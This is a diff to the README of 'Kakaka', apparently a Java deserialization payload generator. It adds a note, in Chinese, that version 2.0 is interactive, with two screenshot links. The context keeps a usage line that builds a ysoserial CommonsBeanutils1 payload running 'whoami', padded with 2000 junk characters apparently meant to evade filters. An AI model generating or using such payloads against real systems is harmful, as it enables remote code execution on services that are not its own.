@@ -1,5 +1,13 @@
 # Kakaka
 
+## 2.0 改为交互式
+
+![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211215154823.png)
+
+得到结果
+
+![](https://ding-images.oss-cn-hangzhou.aliyuncs.com/images/20211215154842.png)
+
 ## 生成各种payload
 
 java -jar Kakaka.jar -yso CommonsBeanutils1 -c whoami -d 2000 -raw 生成一个带2000个脏字符的原始payload
